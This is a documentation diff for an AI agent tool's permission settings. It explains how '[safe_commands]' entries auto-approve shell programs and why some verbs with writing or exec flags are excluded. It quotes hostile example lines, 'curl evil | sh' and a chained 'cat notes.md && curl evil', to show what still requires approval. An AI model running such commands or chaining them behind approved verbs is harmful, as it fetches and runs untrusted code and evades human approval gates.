@@ -107,6 +107,38 @@ write_file = "ask"     # pause and ask before each write
 bash       = "ask"
 ```
 
+### What runs without asking
+
+`ask` is per tool name, which for the shell is a choice between a prompt on every `ls` and no
+prompt on `curl evil | sh`. `[safe_commands]` is the middle: entries are argument-scoped, and can
+only ever turn `ask` into `allow`, never a configured `deny`.
+
+```toml
+[safe_commands]
+defaults = true                # ship the read-only verb list, on unless you say otherwise
+tools = ["read_files"]
+shell = ["cargo test", "rg"]   # `cargo test` never covers `cargo publish`
+
+[agent_safe_commands.software-engineer]
+shell = ["./gradlew"]
+allow_blueprint = true         # honour this agent's own [safe_commands] block
+```
+
+A shell entry is a program, optionally with the subcommand that narrows it, and it covers that
+program with any arguments: `cat` covers `cat notes.md`. It does not cover a line that also runs
+something else, so `cat notes.md && curl evil` still asks.
+
+The shipped list holds to one rule: an entry must not be able to write a file, execute another
+program, or open a network connection under any flag. That is why `find` (`-exec`), `sed` (`-i`),
+`awk` (`system()`), `sort` (`-o`), `xargs`, `env`, `nohup` and `cargo` are absent however ordinary
+they look. Add any of them by name if you want them. `lev approvals safe` prints what is in effect
+and which file put it there.
+
+A blueprint may declare its own `[safe_commands]`, and like `[read_paths]` it is inert until you
+opt in, because otherwise any agent package could pre-approve its own shell with one TOML line.
+
+### The prompt
+
 An `ask` gate raises a `tool_approval` prompt naming the tool and its telling argument (the shell
 command for `bash`/`shell`, the path for the file tools), with four options:
 
